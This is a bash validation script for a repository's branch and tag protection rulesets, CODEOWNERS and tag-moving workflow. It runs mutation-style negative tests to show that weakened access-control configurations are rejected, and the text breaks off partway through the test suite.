#!/usr/bin/env bash
set -euo pipefail

# Deterministic, offline validation for the complete fleet branch/tag guard.
# In addition to checking the positive source, this script mutates one control
# at a time and proves every G18 negative is rejected.

root="${REGISTRY_GUARD_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)}"
script_self="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"
readonly root script_self
readonly kargo_actor_id=1001
readonly fleet_admin_team_id=1002
readonly a33_app_id=1003
readonly a33_installation_id=1004

readonly codeowners="${root}/.github/CODEOWNERS"
readonly branch_template="${root}/.github/rulesets/registry-guard-main.json"
readonly update_template="${root}/.github/rulesets/machinery-stable-update.json"
readonly delete_template="${root}/.github/rulesets/machinery-stable-delete.json"
readonly forward_template="${root}/.github/rulesets/machinery-stable-forward-only.json"
readonly other_template="${root}/.github/rulesets/other-tags-protected.json"
readonly apply_script="${root}/scripts/local/registry-guard-apply.sh"
readonly e2e_helper="${root}/scripts/local/registry-guard-e2e.sh"
readonly tag_helper="${root}/scripts/local/machinery-stable-tag-move.sh"
readonly tag_workflow="${root}/.github/workflows/machinery-stable-tag-move.yaml"
readonly e2e_workflow="${root}/.github/workflows/registry-guard-e2e.yaml"
readonly ordinary_fixture_workflow="${root}/registry/fixtures/guard-sandbox/.github/workflows/ordinary-token-guard-e2e.yaml"
readonly pointer="${root}/registry/machinery-stable.yaml"
negative_cases_executed=0

fail() {
  echo "❌ $1" >&2
  exit 1
}

require_file() {
  [ -s "$1" ] || fail "required guard source $1 is missing"
}

assert_codeowner() {
  local file="$1"
  local pattern="$2"
  awk -v pattern="${pattern}" '
    $1 == pattern { count += 1; owner = $2; fields = NF }
    END { exit !(count == 1 && fields == 2 && owner == "@AtomiCloud/fleet-admin") }
  ' "${file}" || fail "CODEOWNERS must assign ${pattern} exactly once to @AtomiCloud/fleet-admin"
}

validate_codeowners() {
  local file="$1"
  require_file "${file}"
  local pattern
  for pattern in \
    '/registry/' \
    '/registry/**' \
    '/.github/' \
    '/.github/**' \
    '/.github/CODEOWNERS' \
    '/.github/rulesets/' \
    '/.github/rulesets/**' \
    '/.github/workflows/' \
    '/.github/workflows/**' \
    '/scripts/ci/' \
    '/scripts/ci/**' \
    '/scripts/validate/' \
    '/scripts/validate/**' \
    '/scripts/local/materialize-fleet.sh' \
    '/scripts/local/registry-guard-apply.sh' \
    '/scripts/local/registry-guard-e2e.sh' \
    '/scripts/local/machinery-stable-tag-move.sh' \
    '/scripts/validate/registry-guard.sh' \
    '/flake.nix' \
    '/flake.lock' \
    '/.envrc' \
    '/nix/' \
    '/nix/**'; do
    assert_codeowner "${file}" "${pattern}"
  done
  if awk '$1 ~ "^/?platforms/" { found = 1 } END { exit !found }' "${file}"; then
    fail 'CODEOWNERS must NOT cover platforms/**'
  fi
}

render_templates() {
  local output_dir="$1"
  mkdir -p "${output_dir}"
  local template rendered
  for template in \
    "${branch_template}" \
    "${update_template}" \
    "${delete_template}" \
    "${forward_template}" \
    "${other_template}"; do
    require_file "${template}"
    rendered="${output_dir}/$(basename "${template}")"
    # envsubst receives an explicit allow-list; no unrelated environment value
    # can alter a checked-in payload.
    # shellcheck disable=SC2016
    KARGO_BOT_ACTOR_ID="${kargo_actor_id}" \
      KARGO_BOT_ACTOR_TYPE=Integration \
      FLEET_ADMIN_TEAM_ACTOR_ID="${fleet_admin_team_id}" \
      MACHINERY_TAG_MOVER_APP_ID="${a33_app_id}" \
      envsubst '${KARGO_BOT_ACTOR_ID} ${KARGO_BOT_ACTOR_TYPE} ${FLEET_ADMIN_TEAM_ACTOR_ID} ${MACHINERY_TAG_MOVER_APP_ID}' \
      <"${template}" >"${rendered}"
    jq -e '.' "${rendered}" >/dev/null || fail "$(basename "${template}") does not render as JSON"
  done
}

validate_rendered_set() {
  local rendered_dir="$1"
  local owners_file="$2"
  local branch="${rendered_dir}/registry-guard-main.json"
  local update="${rendered_dir}/machinery-stable-update.json"
  local deletion="${rendered_dir}/machinery-stable-delete.json"
  local forward="${rendered_dir}/machinery-stable-forward-only.json"
  local other="${rendered_dir}/other-tags-protected.json"
  local file a33_count total_a33=0

  validate_codeowners "${owners_file}"
  for file in "${branch}" "${update}" "${deletion}" "${forward}" "${other}"; do
    require_file "${file}"
    jq -e '
      .enforcement == "active"
      and ([.bypass_actors[]?.actor_id | type == "number" and . > 0 and floor == .] | all)
    ' "${file}" >/dev/null || fail "$(basename "${file}") is inactive or carries a non-numeric actor ID"
    if jq -e --argjson installation_id "${a33_installation_id}" \
      '.bypass_actors[]? | select(.actor_type == "Integration" and .actor_id == $installation_id)' "${file}" >/dev/null; then
      fail "$(basename "${file}") uses the A33 installation ID as actor_id"
    fi
  done

  jq -e --argjson kargo "${kargo_actor_id}" '
    .name == "registry-guard-main"
    and .target == "branch"
    and .conditions.ref_name == {include: ["~DEFAULT_BRANCH"], exclude: []}
    and ([.rules[].type] | sort) == ["deletion", "non_fast_forward", "pull_request"]
    and ([.rules[] | select(.type == "pull_request")] | length) == 1
    and (.rules[] | select(.type == "pull_request") |
      .parameters.require_code_owner_review == true
      and .parameters.required_approving_review_count >= 1
      and .parameters.dismiss_stale_reviews_on_push == true
      and .parameters.require_last_push_approval == true)
    and (.bypass_actors | length) == 1
    and .bypass_actors[0] == {actor_id: $kargo, actor_type: "Integration", bypass_mode: "always"}
  ' "${branch}" >/dev/null || fail 'main ruleset must preserve PR/code-owner review, fresh last-push approval, deletion/NFF, and Kargo Always bypass'

  jq -e --argjson team "${fleet_admin_team_id}" --argjson app "${a33_app_id}" '
    .name == "machinery-stable-create-update"
    and .target == "tag"
    and .conditions.ref_name == {include: ["refs/tags/machinery-stable"], exclude: []}
    and ([.rules[].type] | sort) == ["creation", "update"]
    and (.bypass_actors | length) == 2
    and ([.bypass_actors[] | select(.actor_type == "Team" and .actor_id == $team and .bypass_mode == "always")] | length) == 1
    and ([.bypass_actors[] | select(.actor_type == "Integration" and .actor_id == $app and .bypass_mode == "always")] | length) == 1
  ' "${update}" >/dev/null || fail 'machinery-stable create/update ruleset must bind fleet-admin plus the A33 App ID'

  jq -e --argjson team "${fleet_admin_team_id}" '
    .name == "machinery-stable-delete"
    and .target == "tag"
    and .conditions.ref_name == {include: ["refs/tags/machinery-stable"], exclude: []}
    and [.rules[].type] == ["deletion"]
    and .bypass_actors == [{actor_id: $team, actor_type: "Team", bypass_mode: "always"}]
  ' "${deletion}" >/dev/null || fail 'machinery-stable deletion ruleset must allow fleet-admin break-glass only'

  jq -e --argjson team "${fleet_admin_team_id}" '
    .name == "machinery-stable-forward-only"
    and .target == "tag"
    and .conditions.ref_name == {include: ["refs/tags/machinery-stable"], exclude: []}
    and [.rules[].type] == ["non_fast_forward"]
    and .bypass_actors == [{actor_id: $team, actor_type: "Team", bypass_mode: "always"}]
  ' "${forward}" >/dev/null || fail 'machinery-stable NFF ruleset must have no A33 bypass'

  jq -e --argjson team "${fleet_admin_team_id}" '
    .name == "other-tags-protected"
    and .target == "tag"
    and .conditions.ref_name == {include: ["~ALL"], exclude: ["refs/tags/machinery-stable"]}
    and ([.rules[].type] | sort) == ["creation", "deletion", "non_fast_forward", "update"]
    and .bypass_actors == [{actor_id: $team, actor_type: "Team", bypass_mode: "always"}]
  ' "${other}" >/dev/null || fail 'other-tag ruleset must be the exact machinery-stable complement with fleet-admin only'

  for file in "${branch}" "${update}" "${deletion}" "${forward}" "${other}"; do
    a33_count="$(jq --argjson app "${a33_app_id}" \
      '[.bypass_actors[]? | select(.actor_type == "Integration" and .actor_id == $app)] | length' "${file}")"
    if [ "${file}" = "${update}" ]; then
      [ "${a33_count}" -eq 1 ] || fail 'A33 must appear exactly once on create/update'
    else
      [ "${a33_count}" -eq 0 ] || fail "A33 is forbidden from $(basename "${file}")"
    fi
    total_a33=$((total_a33 + a33_count))
  done
  [ "${total_a33}" -eq 1 ] || fail 'aggregate rulesets must contain exactly one A33 bypass'
}

validate_raw_templates() {
  local line
  while IFS= read -r line; do
    # These are literal envsubst placeholders in the ruleset sources.
    # shellcheck disable=SC2016
    case "${line}" in
    *'${KARGO_BOT_ACTOR_ID}'* | *'${FLEET_ADMIN_TEAM_ACTOR_ID}'* | *'${MACHINERY_TAG_MOVER_APP_ID}'*) ;;
    *) fail "literal or unknown actor_id in ruleset source: ${line}" ;;
    esac
  done < <(grep -H '"actor_id"[[:space:]]*:' \
    "${branch_template}" "${update_template}" "${delete_template}" "${forward_template}" "${other_template}")

  # shellcheck disable=SC2016
  [ "$(grep -hFo '${MACHINERY_TAG_MOVER_APP_ID}' "${branch_template}" "${update_template}" "${delete_template}" "${forward_template}" "${other_template}" | wc -l)" -eq 1 ] ||
    fail 'A33 placeholder must occur once across ruleset source'
  # shellcheck disable=SC2016
  [ "$(grep -hFo '${FLEET_ADMIN_TEAM_ACTOR_ID}' "${branch_template}" "${update_template}" "${delete_template}" "${forward_template}" "${other_template}" | wc -l)" -eq 4 ] ||
    fail 'fleet-admin team placeholder must occur once in each tag ruleset'
}

require_literal() {
  local file="$1"
  local literal="$2"
  local message="$3"
  grep -Fq -- "${literal}" "${file}" || fail "${message}"
}

expect_yaml_json() {
  local file="$1"
  local query="$2"
  local expected="$3"
  local message="$4"
  local actual_json expected_json

  actual_json="$(yq -o=json "${query}" "${file}" | jq -cS .)" ||
    fail "${message} (YAML parse/query failed)"
  expected_json="$(jq -cS . <<<"${expected}")" ||
    fail "${message} (validator expected JSON is invalid)"
  [ "${actual_json}" = "${expected_json}" ] || fail "${message}"
}

validate_tag_workflow_shape() {
  expect_yaml_json "${tag_workflow}" 'keys | sort' \
    '["concurrency", "jobs", "name", "on", "permissions"]' \
    'tag workflow must have no extra top-level execution surface'
  expect_yaml_json "${tag_workflow}" '.on' \
    '{"push": {"branches": ["main"], "paths": ["registry/machinery-stable.yaml"]}}' \
    'tag workflow trigger must be exactly main plus the machinery-stable pointer path'
  expect_yaml_json "${tag_workflow}" '.permissions' '{"contents": "read"}' \
    'tag workflow ordinary token permissions must be exactly contents:read'
  expect_yaml_json "${tag_workflow}" '.concurrency' \
    '{"group": "machinery-stable-tag-move", "cancel-in-progress": false}' \
    'tag workflow concurrency must be the fixed non-cancelling tag group'
  expect_yaml_json "${tag_workflow}" '.jobs | keys | sort' '["move-forward"]' \
    'tag workflow must have exactly one move-forward job'
  expect_yaml_json "${tag_workflow}" '.jobs["move-forward"] | keys | sort' \
    '["environment", "if", "permissions", "runs-on", "steps", "timeout-minutes"]' \
    'tag workflow job must have no extra execution surface'
  expect_yaml_json "${tag_workflow}" '.jobs["move-forward"].environment' \
    '{"name": "machinery-stable-tag-move"}' \
    'tag workflow job must use the protected machinery-stable environment'
  expect_yaml_json "${tag_workflow}" '.jobs["move-forward"].permissions' '{"contents": "read"}' \
    'tag workflow job ordinary token permissions must be exactly contents:read'
  # The dollar expressions below are literal GitHub workflow syntax.
  # shellcheck disable=SC2016
  expect_yaml_json "${tag_workflow}" \
    '[.jobs["move-forward"].steps[] | with_entries(select(.value != null))]' \
    '[
      {
        "name": "Check out the triggering main commit with the read-only workflow token",
        "uses": "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
        "with": {"fetch-depth": 0, "fetch-tags": false, "ref": "${{ github.sha }}"}
      },
      {
        "name": "Mint the one-hour A33 installation token inside the protected environment",
        "id": "machinery-token",
        "uses": "actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1",
        "with": {
          "app-id": "${{ secrets.FLEET_MACHINERY_TAG_MOVER_APP_ID }}",
          "private-key": "${{ secrets.FLEET_MACHINERY_TAG_MOVER_PRIVATE_KEY }}",
          "owner": "AtomiCloud",
          "repositories": "fleet",
          "permission-contents": "write"
        }
      },
      {
        "name": "Advance only refs/tags/machinery-stable without force",
        "env": {"GH_TOKEN": "${{ steps.machinery-token.outputs.token }}"},
        "shell": "bash",
        "run": "bash ./scripts/local/machinery-stable-tag-move.sh"
      }
    ]' \
    'tag workflow step list must be exactly checkout, protected A33 mint, and fixed helper'
}

validate_source_surface() {
  local file
  for file in "${apply_script}" "${e2e_helper}" "${tag_helper}" "${tag_workflow}" "${e2e_workflow}" "${ordinary_fixture_workflow}" "${pointer}"; do
    require_file "${file}"
  done
  for file in "${apply_script}" "${e2e_helper}" "${tag_helper}" "${root}/scripts/validate/registry-guard.sh"; do
    [ -x "${file}" ] || fail "guard script must remain executable: ${file}"
  done

  require_literal "${apply_script}" "readonly app_slug='fleet-machinery-tag-mover'" 'apply script must pin the exact App slug'
  # The following single-quoted values are exact source literals, not shell input.
  # shellcheck disable=SC2016
  require_literal "${apply_script}" 'app_json="$(gh api "/apps/${app_slug}")"' 'apply script must resolve slug through GET /apps/{app_slug}'
  # shellcheck disable=SC2016
  require_literal "${apply_script}" 'repositories_json="$(gh api "user/installations/${installation_id}/repositories?per_page=100")"' 'apply script must enumerate the selected installation repositories'
  require_literal "${apply_script}" '.permissions == {contents: "write", metadata: "read"}' 'apply script must require exact App permissions'
  require_literal "${apply_script}" 'validate_protected_environment' 'apply script must preflight the protected A33 environment'
  # shellcheck disable=SC2016
  require_literal "${apply_script}" 'repos/${repo}/codeowners/errors' 'apply script must require clean GitHub CODEOWNERS diagnostics'
  require_literal "${apply_script}" '--paginate --slurp' 'apply script must paginate ruleset discovery'
  require_literal "${apply_script}" 'FLEET_MACHINERY_TAG_MOVER_PRIVATE_KEY' 'apply script must reject a repository-level A33 private key'
  # shellcheck disable=SC2016
  require_literal "${apply_script}" 'live ruleset ${name} contains forbidden A33 bypass; refusing to mutate' 'apply script must refuse forbidden live A33 bypasses before mutation'
  # shellcheck disable=SC2016
  require_literal "${apply_script}" 'ruleset ${name} is absent or duplicated after apply' 'apply script must fail if an expected live ruleset is absent'

  validate_tag_workflow_shape

  require_literal "${tag_helper}" "readonly expected_repo='AtomiCloud/fleet'" 'tag helper must pin the production repository'
  require_literal "${tag_helper}" "readonly expected_ref='refs/heads/main'" 'tag helper must reject non-main events'
  require_literal "${tag_helper}" "readonly stable_ref='refs/tags/machinery-stable'" 'tag helper must pin the only writable ref'
  # shellcheck disable=SC2016
  require_literal "${tag_helper}" 'git merge-base --is-ancestor "${GITHUB_SHA}" "${main_sha}"' 'tag helper must keep the trigger on current main'
  require_literal "${tag_helper}" 'pointer superseded on current main' 'tag helper must handle a superseding pointer explicitly'
  # shellcheck disable=SC2016
  require_literal "${tag_helper}" 'git merge-base --is-ancestor "${target_sha}" "${main_sha}"' 'tag helper must require the pointer on main'
  # shellcheck disable=SC2016
  require_literal "${tag_helper}" 'git merge-base --is-ancestor "${current_sha}" "${target_sha}"' 'tag helper must require a forward descendant'
  # shellcheck disable=SC2016
  require_literal "${tag_helper}" 'git merge-base --is-ancestor "${target_sha}" "${verified_sha}"' 'tag helper must accept only a forward concurrent verification target'
  # shellcheck disable=SC2016
  require_literal "${tag_helper}" 'git merge-base --is-ancestor "${verified_sha}" "${verified_main_sha}"' 'tag helper must reject a post-write target outside main'
  require_literal "${tag_helper}" "'{sha: \$sha, force: false}'" 'tag helper must send force:false'
  # shellcheck disable=SC2016
  require_literal "${tag_helper}" 'repos/${expected_repo}/git/refs/tags/machinery-stable' 'tag helper must call the fixed tag endpoint'
  grep -Fq 'force: true' "${tag_helper}" && fail 'production tag helper must never send force:true'
  grep -Fq '/git/refs/heads/' "${tag_helper}" && fail 'production tag helper must contain no branch-write endpoint'
  grep -Fq -- '--method DELETE' "${tag_helper}" && fail 'production tag helper must contain no delete path'

  [ "$(sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' "${pointer}")" = 'target: 752170d700411ae4393e5dd92e9871708561932b' ] ||
    fail 'initial machinery-stable pointer must be the verified authoritative fleet main SHA'

  grep -Eq '^[[:space:]]+pull_request:' "${e2e_workflow}" && fail 'sandbox e2e must not require secrets on pull_request'
  require_literal "${e2e_workflow}" 'AtomiCloud/fleet-guard-sandbox' 'periodic e2e must target the named non-production sandbox'
  # shellcheck disable=SC2016
  grep -Fq '${{ github.token }}' "${e2e_workflow}" && fail 'production e2e must not misuse its cross-repository github.token as ordinary-token proof'
  # shellcheck disable=SC2016
  require_literal "${e2e_helper}" '[ "${sandbox_repo}" != "${production_repo}" ]' 'sandbox helper must explicitly refuse production'
  require_literal "${e2e_helper}" 'classify_policy_denial' 'sandbox helper must classify denial status and body separately'
  require_literal "${e2e_helper}" 'ordinary-token-guard-e2e.yaml' 'production helper must dispatch the sandbox-native ordinary-token fixture'
  expect_yaml_json "${ordinary_fixture_workflow}" '.permissions' '{"contents": "write"}' \
    'sandbox-native ordinary-token fixture must deliberately receive contents:write'
  expect_yaml_json "${ordinary_fixture_workflow}" '.jobs | keys | sort' '["ordinary-token-policy-denial"]' \
    'sandbox-native ordinary-token fixture must have one fixed probe job'
  expect_yaml_json "${ordinary_fixture_workflow}" '.jobs["ordinary-token-policy-denial"].steps | length' '1' \
    'sandbox-native ordinary-token fixture must have one fixed probe step'
  for literal in \
    'Human direct main write is rejected' \
    'Registry PR blocks before code-owner review and merges after approval' \
    'Non-exempt human direct machinery-stable force move is rejected' \
    'A19 machinery-stable creation is rejected' \
    'A20 machinery-stable update and deletion are rejected' \
    'Sandbox-native ordinary workflow token machinery-stable creation is rejected' \
    'Sandbox-native ordinary workflow token update and deletion are rejected' \
    'REVIEW_REQUIRED' \
    'raw A33 force:true backtrack (R7)' \
    'A33 stable-tag deletion' \
    'A33 other-tag creation' \
    'scratch non-main branch create/update' \
    'Always clean platforms-only proof' \
    'FLEET_GUARD_ORDINARY_TOKEN_EVIDENCE'; do
    if ! grep -Fq -- "${literal}" "${e2e_workflow}" "${e2e_helper}" "${ordinary_fixture_workflow}"; then
      fail "sandbox e2e is missing behavior marker: ${literal}"
    fi
  done
}

write_metadata_fixtures() {
  local dir="$1"
  mkdir -p "${dir}"
  jq -n '{
    id: 1003,
    slug: "fleet-machinery-tag-mover",
    owner: {login: "AtomiCloud"},
    permissions: {contents: "write", metadata: "read"},
    events: []
  }' >"${dir}/app.json"
  jq -n '{
    id: 1004,
    app_id: 1003,
    app_slug: "fleet-machinery-tag-mover",
    account: {login: "AtomiCloud"},
    target_type: "Organization",
    repository_selection: "selected",
    permissions: {contents: "write", metadata: "read"}
  }' >"${dir}/installation.json"
  jq -n '{total_count: 1, repositories: [{full_name: "AtomiCloud/fleet"}]}' >"${dir}/repositories.json"
  jq -n '{id: 1002, slug: "fleet-admin", organization: {login: "AtomiCloud"}}' >"${dir}/team.json"
  jq -n '{
    name: "machinery-stable-tag-move",
    deployment_branch_policy: {
      protected_branches: false,
      custom_branch_policies: true
    },
    protection_rules: [{
      type: "required_reviewers",
      prevent_self_review: true,
      reviewers: [{type: "Team", reviewer: {id: 1002}}]
    }]
  }' >"${dir}/environment.json"
  jq -n '[{name: "main", type: "branch"}]' >"${dir}/branch-policies.json"
  jq -n '[]' >"${dir}/repository-secrets.json"
}

run_metadata_contract() {
  local dir="$1"
  bash "${apply_script}" --validate-a33-metadata \
    "${dir}/app.json" "${dir}/installation.json" "${dir}/repositories.json" "${dir}/team.json"
}

run_environment_contract() {
  local dir="$1"
  bash "${apply_script}" --validate-protected-environment \
    "${dir}/environment.json" "${dir}/branch-policies.json" "${dir}/repository-secrets.json" 1002
}

write_denial_fixture() {
  local dir="$1"
  mkdir -p "${dir}"
  jq -n '{message: "Repository rule violations found"}' >"${dir}/policy.json"
}

run_policy_denial_contract() {
  local status="$1"
  local body_file="$2"
  bash "${e2e_helper}" --classify-policy-denial "${status}" "${body_file}"
}

mutate_json() {
  local file="$1"
  local filter="$2"
  local replacement="${file}.new"
  jq "${filter}" "${file}" >"${replacement}"
  mv "${replacement}" "${file}"
}

expect_metadata_rejected() {
  local suite_dir="$1"
  local valid_dir="$2"
  local label="$3"
  local file_name="$4"
  local filter="$5"
  local case_dir
  case_dir="${suite_dir}/metadata-$(printf '%s' "${label}" | tr ' /:' '---')"
  cp -R "${valid_dir}" "${case_dir}"
  mutate_json "${case_dir}/${file_name}" "${filter}"
  if run_metadata_contract "${case_dir}" >/dev/null 2>&1; then
    fail "negative did not go red: ${label}"
  fi
  negative_cases_executed=$((negative_cases_executed + 1))
}

expect_environment_rejected() {
  local suite_dir="$1"
  local valid_dir="$2"
  local label="$3"
  local file_name="$4"
  local filter="$5"
  local case_dir
  case_dir="${suite_dir}/environment-$(printf '%s' "${label}" | tr ' /:' '---')"
  cp -R "${valid_dir}" "${case_dir}"
  mutate_json "${case_dir}/${file_name}" "${filter}"
  if run_environment_contract "${case_dir}" >/dev/null 2>&1; then
    fail "negative did not go red: ${label}"
  fi
  negative_cases_executed=$((negative_cases_executed + 1))
}

expect_policy_denial_rejected() {
  local suite_dir="$1"
  local valid_dir="$2"
  local label="$3"
  local status="$4"
  local filter="$5"
  local case_dir
  case_dir="${suite_dir}/policy-denial-$(printf '%s' "${label}" | tr ' /:' '---')"
  mkdir -p "${case_dir}"
  cp "${valid_dir}/policy.json" "${case_dir}/policy.json"
  mutate_json "${case_dir}/policy.json" "${filter}"
  if run_policy_denial_contract "${status}" "${case_dir}/policy.json" >/dev/null 2>&1; then
    fail "negative did not go red: ${label}"
  fi
  negative_cases_executed=$((negative_cases_executed + 1))
}

expect_rendered_rejected() {
  local suite_dir="$1"
  local valid_rendered="$2"
  local label="$3"
  local file_name="$4"
  local filter="$5"
  local case_dir
  case_dir="${suite_dir}/rendered-$(printf '%s' "${label}" | tr ' /:' '---')"
  mkdir -p "${case_dir}"
  cp -R "${valid_rendered}" "${case_dir}/payloads"
  cp "${codeowners}" "${case_dir}/CODEOWNERS"
  mutate_json "${case_dir}/payloads/${file_name}" "${filter}"
  if bash "${script_self}" --validate-rendered "${case_dir}/payloads" "${case_dir}/CODEOWNERS" >/dev/null 2>&1; then
    fail "negative did not go red: ${label}"
  fi
  negative_cases_executed=$((negative_cases_executed + 1))
}

expect_absent_rejected() {
  local suite_dir="$1"
  local valid_rendered="$2"
  local label="$3"
  local file_name="$4"
  local case_dir
  case_dir="${suite_dir}/absent-$(printf '%s' "${label}" | tr ' /:' '---')"
  mkdir -p "${case_dir}"
  cp -R "${valid_rendered}" "${case_dir}/payloads"
  cp "${codeowners}" "${case_dir}/CODEOWNERS"
  rm -- "${case_dir}/payloads/${file_name}"
  if bash "${script_self}" --validate-rendered "${case_dir}/payloads" "${case_dir}/CODEOWNERS" >/dev/null 2>&1; then
    fail "negative did not go red: ${label}"
  fi
  negative_cases_executed=$((negative_cases_executed + 1))
}

expect_codeowners_rejected() {
  local suite_dir="$1"
  local valid_rendered="$2"
  local label="$3"
  local expression="$4"
  local case_dir
  case_dir="${suite_dir}/owners-$(printf '%s' "${label}" | tr ' /:' '---')"
  mkdir -p "${case_dir}"
  cp -R "${valid_rendered}" "${case_dir}/payloads"
  awk "${expression}" "${codeowners}" >"${case_dir}/CODEOWNERS"
  if bash "${script_self}" --validate-rendered "${case_dir}/payloads" "${case_dir}/CODEOWNERS" >/dev/null 2>&1; then
    fail "negative did not go red: ${label}"
  fi
  negative_cases_executed=$((negative_cases_executed + 1))
}

copy_source_fixture() {
  local destination="$1"
  mkdir -p \
    "${destination}/.github/rulesets" \
    "${destination}/.github/workflows" \
    "${destination}/scripts/local" \
    "${destination}/scripts/validate" \
    "${destination}/registry/fixtures/guard-sandbox/.github/workflows"
  cp -p "${codeowners}" "${destination}/.github/CODEOWNERS"
  cp -p \
    "${branch_template}" \
    "${update_template}" \
    "${delete_template}" \
    "${forward_template}" \
    "${other_template}" \
    "${destination}/.github/rulesets/"
  cp -p "${tag_workflow}" "${e2e_workflow}" "${destination}/.github/workflows/"
  cp -p "${apply_script}" "${e2e_helper}" "${tag_helper}" "${destination}/scripts/local/"
  cp -p "${script_self}" "${destination}/scripts/validate/registry-guard.sh"
  cp -p "${pointer}" "${destination}/registry/machinery-stable.yaml"
  cp -p "${ordinary_fixture_workflow}" \
    "${destination}/registry/fixtures/guard-sandbox/.github/workflows/ordinary-token-guard-e2e.yaml"
}

run_source_contract() {
  local source_root="$1"
  REGISTRY_GUARD_ROOT="${source_root}" REGISTRY_GUARD_NEGATIVE_TESTS=0 \
    bash "${script_self}"
}

expect_workflow_source_rejected() {
  local suite_dir="$1"
  local valid_source="$2"
  local label="$3"
  local filter="$4"
  local case_dir
  case_dir="${suite_dir}/source-$(printf '%s' "${label}" | tr ' /:' '---')"
  cp -a "${valid_source}" "${case_dir}"
  yq -i "${filter}" "${case_dir}/.github/workflows/machinery-stable-tag-move.yaml"
  if run_source_contract "${case_dir}" >/dev/null 2>&1; then
    fail "negative did not go red: ${label}"
  fi
  negative_cases_executed=$((negative_cases_executed + 1))
}

run_negative_suite() {
  local suite_dir="$1"
  local rendered_dir="$2"
  local metadata_dir="${suite_dir}/metadata-valid"
  local denial_dir="${suite_dir}/policy-denial-valid"
  local source_dir="${suite_dir}/source-valid"

  negative_cases_executed=0
  validate_rendered_set "${rendered_dir}" "${codeowners}"
  write_metadata_fixtures "${metadata_dir}"
  run_metadata_contract "${metadata_dir}" >/dev/null || fail 'valid App metadata control fixture was rejected'
  run_environment_contract "${metadata_dir}" >/dev/null || fail 'valid protected-environment control fixture was rejected'
  write_denial_fixture "${denial_dir}"
  run_policy_denial_contract 422 "${denial_dir}/policy.json" >/dev/null || fail 'valid policy-denial control fixture was rejected'
  copy_source_fixture "${source_dir}"
  run_source_contract "${source_dir}" >/dev/null || fail 'valid source control fixture was rejected'

  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'App slug mismatch' app.json '.slug = "wrong-slug"'
  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'App owner mismatch' app.json '.owner.login = "WrongOwner"'
  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'App actor ID fractional' app.json '.id = 1003.5'
  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'installation App mismatch' installation.json '.app_id = 9999'
  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'installation actor ID fractional' installation.json '.id = 1004.5'
  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'fleet-admin Team actor ID fractional' team.json '.id = 1002.5'
  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'selected repository mode mismatch' installation.json '.repository_selection = "all"'
  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'selected repository scope mismatch' repositories.json '.repositories[0].full_name = "AtomiCloud/other"'
  expect_metadata_rejected "${suite_dir}" "${metadata_dir}" 'Contents permission mismatch' app.json '.permissions.contents = "read"'

  expect_environment_rejected "${suite_dir}" "${metadata_dir}" 'protected environment self-review allowed' environment.json '(.protection_rules[] | select(.type == "required_reviewers") | .prevent_self_review) = false'
  expect_environment_rejected "${suite_dir}" "${metadata_dir}" 'protected environment reviewer drift' environment.json '(.protection_rules[] | select(.type == "required_reviewers") | .reviewers[0].reviewer.id) = 9999'
  expect_environment_rejected "${suite_dir}" "${metadata_dir}" 'repository-level A33 private key present' repository-secrets.json '. += [{name: "FLEET_MACHINERY_TAG_MOVER_PRIVATE_KEY"}]'

  expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" '404 never proves policy denial' 404 '.'
  expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" 'missing scope never proves policy denial' 403 '.message = "Resource not accessible by integration"'
  expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" 'existing ref never proves policy denial' 422 '.message = "Reference already exists"'
  expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" 'generic 422 never proves policy denial' 422 '.message = "Validation Failed"'

  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'code-owner review removed' registry-guard-main.json '(.rules[] | select(.type == "pull_request") | .parameters.require_code_owner_review) = false'
  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'stale reviews retained' registry-guard-main.json '(.rules[] | select(.type == "pull_request") | .parameters.dismiss_stale_reviews_on_push) = false'
  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'last push approval removed' registry-guard-main.json '(.rules[] | select(.type == "pull_request") | .parameters.require_last_push_approval) = false'
  # These are literal awk programs; their dollar fields must not expand here.
  # shellcheck disable=SC2016
  expect_codeowners_rejected "${suite_dir}" "${rendered_dir}" 'registry owner missing' '$1 != "/registry/**" { print }'
  # shellcheck disable=SC2016
  expect_codeowners_rejected "${suite_dir}" "${rendered_dir}" 'GitHub root owner missing' '$1 != "/.github/" { print }'
  # shellcheck disable=SC2016
  expect_codeowners_rejected "${suite_dir}" "${rendered_dir}" 'rulesets root owner missing' '$1 != "/.github/rulesets/" { print }'
  # shellcheck disable=SC2016
  expect_codeowners_rejected "${suite_dir}" "${rendered_dir}" 'CI enforcement root owner missing' '$1 != "/scripts/ci/" { print }'
  # shellcheck disable=SC2016
  expect_codeowners_rejected "${suite_dir}" "${rendered_dir}" 'extra owner appended' '{ if ($1 == "/registry/**") print $0 " @AtomiCloud/not-admin"; else print }'
  # shellcheck disable=SC2016
  expect_codeowners_rejected "${suite_dir}" "${rendered_dir}" 'non fleet-admin owner' '{ if ($1 == "/registry/**") $2 = "@AtomiCloud/not-admin"; print }'

  expect_absent_rejected "${suite_dir}" "${rendered_dir}" 'tag ruleset absent' machinery-stable-delete.json
  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'installation ID used as actor ID' machinery-stable-update.json '(.bypass_actors[] | select(.actor_id == 1003) | .actor_id) = 1004'
  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'fractional actor ID used' machinery-stable-update.json '(.bypass_actors[] | select(.actor_id == 1003) | .actor_id) = 1003.5'
  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'A33 permitted deletion' machinery-stable-delete.json '.bypass_actors += [{actor_id: 1003, actor_type: "Integration", bypass_mode: "always"}]'
